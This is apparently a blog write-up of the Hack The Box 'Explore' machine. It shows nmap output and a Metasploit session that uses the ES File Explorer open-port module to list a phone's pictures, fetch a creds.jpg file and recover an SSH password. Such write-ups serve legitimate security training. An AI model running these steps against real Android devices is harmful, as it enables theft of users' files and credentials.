---
title: "Explore from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Explore from HTB
`nmap`gave this:
```
PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     (protocol 2.0)
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
42135/tcp open  http    ES File Explorer Name Response httpd
|_http-server-header: ES Name Response Server
|_http-title: Site doesn't have a title (text/html).
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.94SVN%I=7%D=9/1%Time=66D37B10%P=x86_64-pc-linux-gnu%r(
SF:NULL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
Service Info: Device: phone



PORT     STATE    SERVICE VERSION
2222/tcp open     ssh     (protocol 2.0)
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
5555/tcp filtered freeciv
```
searching things on `ports`we get to this
https://www.speedguide.net/port.php?port=59777 --- 59777 port
```
msf6 > search es file explorer

Matching Modules
================

   #   Name                                                                                       Disclosure Date  Rank       Check  Description
   -   ----                                                                                       ---------------  ----       -----  -----------
   0   auxiliary/scanner/http/es_file_explorer_open_port                                          2019-01-16       normal     No     ES File Explorer Open Port


msf6 > use auxiliary/scanner/http/es_file_explorer_open_port
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > options

Module options (auxiliary/scanner/http/es_file_explorer_open_port):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   ACTIONITEM                   no        If an app or filename if required by the action
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT       59777            yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   THREADS     1                yes       The number of concurrent threads (max one per host)
   VHOST                        no        HTTP server virtual host


msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set RHOSTS 10.10.10.247
RHOSTS => 10.10.10.247
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > exploit

[+] 10.10.10.247:59777   - Name: VMware Virtual Platform
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > show actions

Auxiliary actions:

       Name            Description
       ----            -----------
       APPLAUNCH       Launch an app. ACTIONITEM required.
   =>  GETDEVICEINFO   Get device info
       GETFILE         Get a file from the device. ACTIONITEM required.
       LISTAPPS        List all the apps installed
       LISTAPPSALL     List all the apps installed
       LISTAPPSPHONE   List all the phone apps installed
       LISTAPPSSDCARD  List all the apk files stored on the sdcard
       LISTAPPSSYSTEM  List all the system apps installed
       LISTAUDIOS      List all the audio files
       LISTFILES       List all the files on the sdcard
       LISTPICS        List all the pictures
       LISTVIDEOS      List all the videos



msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set action LISTPICS
action => LISTPICS

msf6 auxiliary(scanner/http/es_file_explorer_open_port) > exploit

[+] 10.10.10.247:59777
  concept.jpg (135.33 KB) - 4/21/21 02:38:08 AM: /storage/emulated/0/DCIM/concept.jpg
  anc.png (6.24 KB) - 4/21/21 02:37:50 AM: /storage/emulated/0/DCIM/anc.png
  creds.jpg (1.14 MB) - 4/21/21 02:38:18 AM: /storage/emulated/0/DCIM/creds.jpg
  224_anc.png (124.88 KB) - 4/21/21 02:37:21 AM: /storage/emulated/0/DCIM/224_anc.png

msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set action GETFILE
action => GETFILE
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
ACTIONITEM => /storage/emulated/0/DCIM/creds.jpg
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > exploit

```
downloading the photo and seeing it we get credentials for `ssh`
![screen](/assets/images/ragaca.jpg)
The password is `Kr1sT!5h@Rp3xPl0r3!`

